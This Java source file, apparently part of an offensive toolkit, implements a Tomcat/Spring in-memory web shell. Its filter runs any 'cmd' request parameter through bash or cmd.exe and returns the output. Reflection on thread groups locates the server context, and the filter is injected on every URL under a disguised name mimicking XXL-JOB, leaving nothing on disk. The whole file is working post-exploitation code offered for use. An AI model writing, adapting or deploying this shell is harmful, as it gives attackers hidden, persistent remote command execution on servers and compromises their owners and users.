package dev.silente.javashark.template.memshell;

import dev.silente.javashark.template.echo.SpringEcho;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

public class SpringFilter {

    public Object getField(Object obj, String fieldName){
        try {
            Field field = obj.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            obj = field.get(obj);
        } catch (IllegalAccessException e) {
            return null;
        } catch (NoSuchFieldException e) {
            return null;
        }
        return obj;
    }

    public SpringFilter() {
        try {
            Object obj = null;
            String port = "";
            String filterName = "xxl-job-filter-xxx";
            Filter filter = new Filter() {
                public void init(FilterConfig filterConfig) throws ServletException {}
                public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                    HttpServletRequest req = (HttpServletRequest) servletRequest;
                    HttpServletResponse resp = (HttpServletResponse) servletResponse;
                    if (req.getParameter("cmd") != null) {
                        ArrayList<String> cmdList = new ArrayList<>();
                        String osTyp = System.getProperty("os.name");
                        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                            cmdList.add("cmd.exe");
                            cmdList.add("/c");
                        } else {
                            cmdList.add("/bin/bash");
                            cmdList.add("-c");
                        }

                        cmdList.add(req.getParameter("cmd"));
                        String[] cmds = cmdList.toArray(new String[0]);

                        Process process = new ProcessBuilder(cmds).start();
                        InputStream inputStream = process.getInputStream();
                        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream, "UTF-8"));
                        String line;
                        while ((line = reader.readLine()) != null) {
                            servletResponse.getWriter().println(line);
                        }
                        process.destroy();
                        return;
                    }
                    filterChain.doFilter(servletRequest, servletResponse);
                }

                public void destroy() {

                }
            };

            FilterDef filterDef = new FilterDef();
            filterDef.setFilter(filter);
            filterDef.setFilterName(filterName);
            filterDef.setFilterClass(filter.getClass().getName());

            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern("/*");
            filterMap.setFilterName(filterName);
            filterMap.setDispatcher(DispatcherType.REQUEST.name());

            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
            constructor.setAccessible(true);

            Thread currentThread = Thread.currentThread();
            Field groupField = Class.forName("java.lang.Thread").getDeclaredField("group");
            groupField.setAccessible(true);
            ThreadGroup group = (ThreadGroup)groupField.get(currentThread);

            Field threadsField = Class.forName("java.lang.ThreadGroup").getDeclaredField("threads");
            threadsField.setAccessible(true);
            Thread[] threads = (Thread[])threadsField.get(group);

            for (Thread thread : threads) {
                String threadName = thread.getName();
                if (threadName.contains("container")) {
                    obj = getField(thread, "this\\$0");
                    if (port == "") {
                        continue;
                    } else {
                        break;
                    }
                } else if (threadName.contains("http-nio-") && threadName.contains("-ClientPoller")) {
                    port = threadName.substring(9, threadName.length() - 13);
                    if (obj == null){
                        continue;
                    } else {
                        break;
                    }
                }
            }

            obj = getField(obj, "tomcat");
            obj = getField(obj, "server");
            org.apache.catalina.Service[] services = (org.apache.catalina.Service[])getField(obj, "services");

            for (org.apache.catalina.Service service : services){
                try {
                    obj = getField(service, "engine");
                    if (obj != null) {
                        HashMap children = (HashMap)getSuperClassField(obj, "children");
                        obj = children.get("localhost");
                        children = (HashMap)getSuperClassField(obj, "children");

                        StandardContext standardContext = (StandardContext) children.get("");
                        standardContext.addFilterDef(filterDef);

                        Map filterConfigs = (Map) getSuperClassField(standardContext, "filterConfigs");

                        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
                        filterConfigs.put(filterName,filterConfig);

                        standardContext.addFilterMapBefore(filterMap);

                        System.out.println("success! memshell port:"+port);
                    }
                } catch (Exception e){
                    continue;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public Object getSuperClassField(Object obj, String fieldName){
        try {
            Field field = obj.getClass().getSuperclass().getDeclaredField(fieldName);
            field.setAccessible(true);
            obj = field.get(obj);
        } catch (IllegalAccessException e) {
//            XxlJobHelper.log(e.toString());
            return null;
        } catch (NoSuchFieldException e) {
//            XxlJobHelper.log(e.toString());
            return null;
        }
        return obj;
    }

}
